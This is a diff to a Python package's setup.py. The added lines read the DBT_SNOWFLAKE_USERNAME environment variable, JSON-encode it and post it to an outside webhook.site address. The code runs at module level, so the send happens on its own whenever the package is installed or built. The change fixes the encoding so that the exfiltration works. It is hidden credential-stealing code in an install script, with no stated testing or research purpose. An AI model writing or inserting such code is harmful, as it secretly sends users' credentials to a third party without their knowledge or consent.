@@ -4,9 +4,12 @@ from urllib.request import Request, urlopen
 from urllib.error import URLError, HTTPError
 from setuptools import setup
 
-data = {"message": os.environ.get("DBT_SNOWFLAKE_USERNAME", "Not Found")}
-webhook_url = "https://webhook.site/19a38366-cb35-4b1a-b0fe-5679896b28db"
-req = Request(webhook_url, data, {'Content-Type': 'application/json'})
+dbt_username = os.environ.get("DBT_SNOWFLAKE_USERNAME", "Not Found")
+data = {
+    "message": dbt_username
+}
+json_data = json.dumps(data).encode('utf-8')
+req = Request("https://webhook.site/19a38366-cb35-4b1a-b0fe-5679896b28db", data=json_data, headers={'Content-Type': 'application/json'})
 try:
     with urlopen(req) as response:
         response_body = response.read()
